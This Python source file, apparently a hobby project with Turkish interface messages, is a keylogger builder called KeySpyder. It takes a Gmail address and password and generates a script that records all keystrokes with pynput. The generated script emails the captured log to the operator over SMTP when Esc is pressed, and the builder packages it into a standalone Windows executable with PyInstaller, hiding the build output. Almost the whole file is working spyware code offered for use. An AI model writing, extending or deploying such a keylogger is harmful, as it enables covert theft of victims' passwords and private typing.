import threading
import smtplib
import pynput.keyboard as ky
from rich.console import Console
from pyfiglet import Figlet
from colorama import Fore,init
from optparse import OptionParser
import re
import textwrap
import os
import subprocess
from pathlib import Path

init(autoreset=True)
console = Console()



class KeySpyder():

    USE_LOG = ''

    def __init__(self):

        self.mail = ''
        self.password = ''
        self.get_user_input()
        self.checkto_file_to_exe()

    def get_user_input(self):

        parser = OptionParser()
        parser.add_option('-m','--mail',dest='mail',help='abc@abc.com biçiminde bir mail adresi giriniz')
        parser.add_option('-p', '--psswd', dest='psswd', help='Şifre giriş alanı')
        options = parser.parse_args()[0]
        if (options.mail is None) and (options.psswd is None):
            console.log('[red]Mail ve password alanı boş bırakılamaz[/red]')
            exit()
        elif options.mail is None:
            console.log('[red]Mail alanı boş bırakılamaz[/red]')
            exit()
        elif options.psswd is None:
            console.log('[red]Password alanı boş bırakılamaz[/red]')
            exit()
        else:
            def is_valid_email(email):
                pattern = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
                return re.match(pattern, email) is not None
            if is_valid_email(options.mail):
                self.mail = options.mail
                self.password = options.psswd
            else:
                console.log('[red]Lütfen uygun formatta bir mail hesabı giriniz...[/red]')

    def checkto_file_to_exe(self):
        file_code = textwrap.dedent(f"""\
        import threading
        import smtplib
        import pynput.keyboard as ky
        from rich.console import Console
        import ctypes
        from email.message import EmailMessage

        console = Console()
        use_log = ''

        def send_to_mail():
            global use_log
            with open('log.txt', 'w', encoding='utf-8') as file:
                file.write(use_log)
            with open('log.txt', 'r', encoding='utf-8') as f:
                data = f.read()
            try:
                msg = EmailMessage()
                msg.set_content(data)
                msg['Subject'] = 'Log Dosyası'
                msg['From'] = '{self.mail}'
                msg['To'] = '{self.mail}'

                sp = smtplib.SMTP("smtp.gmail.com", 587)
                sp.starttls()
                sp.login('{self.mail}', '{self.password}')
                sp.send_message(msg)
                sp.quit()
            except Exception as e:
                console.log('[red]Mail gönderilirken bir hata oluştu[/red]')

        def is_capslock_on():
            return bool(ctypes.WinDLL("User32.dll").GetKeyState(0x14) & 1)

        def on_prees_function(key):
            global use_log
            try:
                if key == ky.Key.esc:
                    send_to_mail()
                    console.log('[yellow]Dinleyiciden çıkış yapılıyor[/yellow]')
                    exit()
                else:
                    if key == ky.Key.enter:
                        use_log = use_log + "\\n"
                    elif key == ky.Key.space:
                        use_log = use_log + ' '
                    elif is_capslock_on():
                        use_log = use_log + str(key.char).upper()
                    else:
                        use_log = use_log + key.char

                    
            except KeyboardInterrupt:
                console.log('[yellow]Dinleyiciden çıkış yapılıyor[/yellow]')
            except AttributeError:
                pass

        listener = ky.Listener(on_press=on_prees_function)
        with listener as listen:
            listen.join()
        """)
        with open('Keyspader.py','w',encoding='utf-8') as file:
            file.write(file_code)

        self.py_to_exe("Keyspader.py", onefile=True, noconsole=False)
        console.log('[green]Exe dosaysı oluşturuldu...[/green]')


    def py_to_exe(self,file_path, onefile=True, noconsole=False):
        if not Path(file_path).exists():
            print(f"[HATA] Dosya bulunamadı: {file_path}")
            return

        command = ["pyinstaller"]

        if onefile:
            command.append("--onefile")

        if noconsole:
            command.append("--noconsole")

        command.append(file_path)

        print("[INFO] EXE dönüştürme işlemi başlatıldı...")

        # Çıktıyı bastırmamak için stdout ve stderr bastırılıyor
        with open(os.devnull, 'w') as devnull:
            subprocess.run(command, stdout=devnull, stderr=devnull)

        print("[INFO] EXE oluşturma tamamlandı.")
        dist_path = Path("dist") / Path(file_path).stem
        print(f"[INFO] EXE dosyası şurada: {dist_path.absolute()}")




if __name__ == '__main__':
    figlet = Figlet(font='slant')
    print(Fore.CYAN + figlet.renderText('KeySpyder'))

    KeySpyder()
